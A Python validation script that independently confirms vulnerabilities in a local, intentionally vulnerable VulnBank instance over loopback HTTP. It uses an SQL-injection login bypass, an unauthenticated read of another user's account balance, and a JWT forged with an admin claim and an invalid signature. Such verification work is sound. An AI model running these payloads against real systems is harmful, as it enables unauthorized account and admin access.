#!/usr/bin/env python3
"""Independently contrast real loopback bank responses; never reports product detection."""
import argparse
import base64
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import re
import urllib.error
import urllib.parse
import urllib.request

REPOSITORY = Path(__file__).resolve().parents[2]


def digest(value):
    return hashlib.sha256(value).hexdigest()


def json_bytes(value):
    return (json.dumps(value, ensure_ascii=False, indent=2) + "\n").encode()


def decode_segment(value):
    return json.loads(base64.urlsafe_b64decode(value + "=" * (-len(value) % 4)))


def encode_segment(value):
    return base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).decode().rstrip("=")


class SameOriginRedirect(urllib.request.HTTPRedirectHandler):
    def __init__(self, origin):
        self.origin = origin

    def redirect_request(self, request, response, code, message, headers, new_url):
        parsed = urllib.parse.urlsplit(new_url)
        if f"{parsed.scheme}://{parsed.netloc}" != self.origin:
            raise ValueError("A bank response tried to redirect outside its loopback origin")
        return super().redirect_request(request, response, code, message, headers, new_url)


class Transport:
    def __init__(self, base, private):
        self.base = base
        self.private = private
        self.records = []
        self.opener = urllib.request.build_opener(urllib.request.ProxyHandler({}), SameOriginRedirect(base))

    def request(self, path, body=None, token=None, actor="anonymous"):
        if not path.startswith("/") or path.startswith("//"):
            raise ValueError("Only a relative bank path is allowed")
        headers = {"Accept": "application/json, text/html", "Accept-Encoding": "identity"}
        if body is not None:
            headers["Content-Type"] = "application/json"
        if token:
            headers["Authorization"] = "Bearer " + token
        data = None if body is None else json.dumps(body).encode()
        request = urllib.request.Request(self.base + path, data=data, headers=headers)
        try:
            response = self.opener.open(request, timeout=15)
        except urllib.error.HTTPError as error:
            response = error
        with response:
            raw = response.read()
            status = response.status
            response_headers = list(response.headers.items())
        evidence_id = f"GTHTTP-{len(self.records) + 1:03d}"
        private_request = json_bytes({"method": request.get_method(), "url": request.full_url,
                                     "headers": headers, "body": body})
        private_response = json_bytes({"status": status, "headers": response_headers})
        for suffix, value in [("request.json", private_request), ("response.json", private_response), ("body.bin", raw)]:
            target = self.private / f"{evidence_id}.{suffix}"
            target.write_bytes(value)
            target.chmod(0o600)
        try:
            parsed = json.loads(raw)
        except (UnicodeDecodeError, ValueError):
            parsed = None
        record = {"evidenceId": evidence_id, "actor": actor, "method": request.get_method(),
                  "path": path, "status": status, "responseBodyBytes": len(raw),
                  "authorizationHeaderPresent": "Authorization" in headers,
                  "cookieHeaderPresent": "Cookie" in headers,
                  "privateRequestSHA256": digest(private_request), "responseBodySHA256": digest(raw),
                  "privateResponseMetadataSHA256": digest(private_response),
                  "privateEvidenceBasename": evidence_id,
                  "wireRepresentation": "HTTP application payload and parsed headers, not TCP framing"}
        self.records.append(record)
        return record, parsed, raw


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--state", type=Path, required=True)
    parser.add_argument("--out", type=Path, required=True)
    parser.add_argument("--private-out", type=Path, required=True)
    args = parser.parse_args()
    state = json.loads(args.state.read_text())
    parsed_base = urllib.parse.urlsplit(state["base"])
    if (parsed_base.scheme != "http" or parsed_base.hostname not in ("127.0.0.1", "localhost", "::1")
            or parsed_base.username or parsed_base.password or parsed_base.path not in ("", "/")
            or parsed_base.query or parsed_base.fragment):
        parser.error("Only the explicitly configured loopback HTTP bank origin is supported")
    base = f"{parsed_base.scheme}://{parsed_base.netloc}"
    output = args.out.resolve()
    private = args.private_out.resolve()
    if private.is_relative_to(REPOSITORY):
        parser.error("Authenticated private evidence must be outside the Git checkout")
    if output.exists() or private.exists():
        parser.error("Preserve previous evidence: use fresh output and private directories")
    private.mkdir(parents=True, mode=0o700)
    output.mkdir(parents=True)
    actors = {actor["name"]: actor for actor in state["actors"]}
    alice, bob, admin = (actors[name] for name in ("wb_alice", "wb_bob", "admin"))
    transport = Transport(base, private)
    health, data, _ = transport.request("/healthz")
    if health["status"] != 200 or not isinstance(data, dict) or data.get("database") != "up":
        raise RuntimeError("The real bank and database are not ready")
    cases = []

    normal, normal_data, _ = transport.request("/login", {"username": "admin", "password": "invalid-independent-control"})
    injected, injected_data, _ = transport.request("/login", {"username": "admin' -- ", "password": "invalid-independent-control"})
    normal_token = isinstance(normal_data, dict) and bool(normal_data.get("token"))
    injection_token = isinstance(injected_data, dict) and bool(injected_data.get("token"))
    cases.append({"id": "GT-SQLLOGIN", "title": "SQL 입력에 의한 관리자 로그인 우회",
                  "category": "confirmed_vulnerability", "confirmed": normal["status"] == 401 and not normal_token
                  and injected["status"] == 200 and injection_token and injected_data.get("isAdmin") is True,
                  "normalControl": {"evidenceId": normal["evidenceId"], "status": normal["status"], "tokenReturned": normal_token},
                  "test": {"evidenceId": injected["evidenceId"], "status": injected["status"], "usernameInput": "admin' -- ",
                           "tokenReturned": injection_token, "isAdmin": injected_data.get("isAdmin") if isinstance(injected_data, dict) else None},
                  "interpretation": "독립 HTTP 대조 재현이며 Workbench 자동 탐지 결과가 아님"})

    account = urllib.parse.quote(str(bob["account"]), safe="")
    own, own_data, _ = transport.request("/check_balance/" + account, token=bob["token"], actor="wb_bob")
    anonymous, anonymous_data, _ = transport.request("/check_balance/" + account)
    matches_bob = (isinstance(anonymous_data, dict) and anonymous_data.get("username") == "wb_bob"
                   and str(anonymous_data.get("account_number")) == str(bob["account"]))
    cases.append({"id": "GT-BOLA", "title": "비로그인 타인 계좌·잔액 조회", "category": "confirmed_vulnerability",
                  "confirmed": own["status"] == anonymous["status"] == 200 and matches_bob,
                  "normalControl": {"evidenceId": own["evidenceId"], "actor": "wb_bob", "status": own["status"]},
                  "test": {"evidenceId": anonymous["evidenceId"], "actor": "anonymous", "status": anonymous["status"],
                           "accountNumber": str(bob["account"]), "returnedUsername": anonymous_data.get("username") if isinstance(anonymous_data, dict) else None,
                           "returnedBalance": anonymous_data.get("balance") if isinstance(anonymous_data, dict) else None},
                  "interpretation": "HTTP200만이 아니라 실제 타인 계정명과 계좌 번호가 반환됨을 확인"})

    alice_admin, _, alice_body = transport.request("/sup3r_s3cr3t_admin", token=alice["token"], actor="wb_alice")
    admin_page, _, admin_body = transport.request("/sup3r_s3cr3t_admin", token=admin["token"], actor="admin")
    no_admin, _, _ = transport.request("/sup3r_s3cr3t_admin")
    cases.append({"id": "GT-ROLE-CONTROL", "title": "관리자 화면의 정상 역할·인증 제어", "category": "normal_control",
                  "controlPassed": alice_admin["status"] == 403 and b"Access Denied" in alice_body
                  and admin_page["status"] == 200 and b"<title>Admin Panel - VulnBank</title>" in admin_body and no_admin["status"] == 401,
                  "responses": [{"evidenceId": r["evidenceId"], "actor": r["actor"], "status": r["status"]}
                                for r in (alice_admin, admin_page, no_admin)],
                  "interpretation": "변조하지 않은 정상 토큰에서 Alice403·관리자200·비로그인401. 모든 API가 무조건 열려 있다는 의미가 아님"})

    loan, loan_data, _ = transport.request("/request_loan", {"amount": -1}, token=alice["token"], actor="wb_alice")
    cases.append({"id": "GT-NEGATIVE-LOAN-CONTROL", "title": "음수 대출 요청의 정상 입력 거절", "category": "normal_control",
                  "controlPassed": loan["status"] == 400 and isinstance(loan_data, dict) and loan_data.get("status") == "error",
                  "test": {"evidenceId": loan["evidenceId"], "amount": -1, "status": loan["status"],
                           "message": loan_data.get("message") if isinstance(loan_data, dict) else None},
                  "interpretation": "거절되는 음수 대출 입력을 이체의 음수 처리 취약점과 구분"})

    segments = alice["token"].split(".")
    if len(segments) != 3:
        raise RuntimeError("The normal seeded login did not issue a three-segment JWT")
    header, claims = decode_segment(segments[0]), decode_segment(segments[1])
    cases.append({"id": "GT-JWT-CLAIMS", "title": "실제 로그인 JWT의 메타데이터", "category": "observed_configuration",
                  "observed": {"algorithm": header.get("alg"), "tokenType": header.get("typ"),
                               "username": claims.get("username"), "isAdmin": claims.get("is_admin"),
                               "issuedAtPresent": "iat" in claims, "expirationPresent": "exp" in claims,
                               "tokenSHA256": digest(alice["token"].encode())},
                  "interpretation": "실제 발급 토큰을 로컬 디코딩한 관측. 만료 항목 누락만으로 임의 서명 수용을 단정하지 않음"})
    modified = dict(claims, is_admin=True)
    # Deliberately invalid HS256 signature, without using the server's signing key.
    forged = encode_segment(dict(header, alg="HS256")) + "." + encode_segment(modified) + "." + base64.urlsafe_b64encode(bytes(32)).decode().rstrip("=")
    forged_page, _, forged_body = transport.request("/sup3r_s3cr3t_admin", token=forged, actor="wb_alice_modified_claim_invalid_signature")
    cases.append({"id": "GT-JWT-SIGNATURE", "title": "잘못된 서명과 관리자 claim 변조 수용", "category": "confirmed_vulnerability",
                  "confirmed": alice_admin["status"] == 403 and claims.get("is_admin") is False
                  and forged_page["status"] == 200 and b"<title>Admin Panel - VulnBank</title>" in forged_body,
                  "normalControl": {"evidenceId": alice_admin["evidenceId"], "status": alice_admin["status"], "isAdminClaim": False},
                  "test": {"evidenceId": forged_page["evidenceId"], "status": forged_page["status"], "isAdminClaim": True,
                           "serverSigningKeyUsed": False, "signatureIntentionallyInvalid": True,
                           "adminPageMarkerReturned": b"<title>Admin Panel - VulnBank</title>" in forged_body,
                           "modifiedTokenSHA256": digest(forged.encode())},
                  "interpretation": "정상 Alice403과 대조한 독립 HTTP 권한 상승 재현. JWT 보기 도구의 자동 취약점 확정 기능을 의미하지 않음"})

    result = {"result": "completed", "source": "independentManualValidation", "productDetected": False,
              "executedAtUTC": datetime.now(timezone.utc).isoformat(), "base": base,
              "scope": "Owned isolated original VulnBank, loopback HTTP only. Independent contrasts, not a Workbench engine score.",
              "requests": transport.records, "requestCount": len(transport.records), "cases": cases,
              "confirmedVulnerabilities": sum(c.get("confirmed") is True for c in cases),
              "normalControlsPassed": sum(c.get("controlPassed") is True for c in cases),
              "observedConfigurationCases": sum(c["category"] == "observed_configuration" for c in cases),
              "transfersOrRegistrationsSent": False, "sourceFilesOrProductFilesModified": False,
              "privateEvidenceOutsideRepository": True,
              "publicOutputIncludesTokensPasswordsOrRawAdminHTML": False,
              "limitations": ["No full authorization coverage", "No real bank or external endpoint", "Not native Burp GUI",
                              "The negative loan POST is rejected; transfer/registration writes are not exercised by this validator"]}
    encoded = json_bytes(result)
    known_secrets = [a["token"] for a in actors.values()] + [state["password"], forged]
    if any(secret.encode() in encoded for secret in known_secrets if secret):
        raise RuntimeError("A private local authentication value reached the public report")
    if re.search(rb"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+", encoded):
        raise RuntimeError("A complete JWT reached the public report")
    (output / "groundtruth.json").write_bytes(encoded)
    print(json.dumps({key: result[key] for key in ("result", "requestCount", "confirmedVulnerabilities", "normalControlsPassed", "observedConfigurationCases")}, ensure_ascii=False))


if __name__ == "__main__":
    main()
